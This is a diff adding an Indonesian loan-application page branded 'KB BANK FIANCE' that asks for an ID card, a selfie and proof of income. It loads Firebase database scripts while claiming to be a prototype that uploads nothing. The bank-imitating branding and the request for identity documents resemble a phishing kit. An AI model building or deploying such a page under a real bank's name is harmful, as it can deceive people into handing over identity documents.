@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>KB BANK FIANCE — Upload Dokumen</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="flow.css">
+</head>
+<body class="flow-page">
+  <main class="flow-shell">
+    <section class="flow-hero">
+      <div class="flow-top">
+        <button class="flow-back" id="backButton" type="button">←</button>
+        <button class="flow-lang" type="button">ID 🇮🇩</button>
+      </div>
+      <div class="flow-copy">
+        <div class="flow-step">Tahap 4</div>
+        <h1>Upload Dokumen</h1>
+        <p>Lengkapi dokumen pendukung sebelum memilih nominal dan tenor.</p>
+      </div>
+    </section>
+    
+<section class="flow-card">
+  <div class="flow-title">
+    <h2>Dokumen Pendukung</h2>
+    <p>Pilih berkas untuk melanjutkan ke formulir pinjaman.</p>
+  </div>
+  <form id="documentForm">
+    <div class="upload-grid">
+      <div class="upload-item">
+        <div><strong>KTP</strong><small id="ktpStatus">Belum dipilih</small></div>
+        <div class="upload-control"><input id="ktp" type="file" accept="image/*,.pdf"><label for="ktp">Pilih File</label></div>
+      </div>
+      <div class="upload-item">
+        <div><strong>Foto Selfie</strong><small id="selfieStatus">Belum dipilih</small></div>
+        <div class="upload-control"><input id="selfie" type="file" accept="image/*"><label for="selfie">Pilih File</label></div>
+      </div>
+      <div class="upload-item">
+        <div><strong>Bukti Penghasilan</strong><small id="incomeStatus">Belum dipilih</small></div>
+        <div class="upload-control"><input id="income" type="file" accept="image/*,.pdf"><label for="income">Pilih File</label></div>
+      </div>
+    </div>
+    <div class="flow-note">Berkas hanya dibaca oleh browser untuk kebutuhan prototipe UI dan tidak diunggah ke server.</div>
+    <button class="flow-button" id="continueButton" type="submit" disabled>LANJUT KE FORM PINJAMAN →</button>
+    <div class="flow-message" id="message"></div>
+  </form>
+</section>
+  </main>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script src="storage.js"></script>
+  <script src="upload-dokumen.js"></script>
+<div style="padding:10px 16px;text-align:center;font-size:10px;line-height:1.5;color:#7c6f89;background:#f7f1fd;border-top:1px solid #eadcf8"><strong>UI Prototype</strong> — Alur, status, dan hasil pada halaman ini merupakan simulasi antarmuka.</div>
+</body>
+</html>
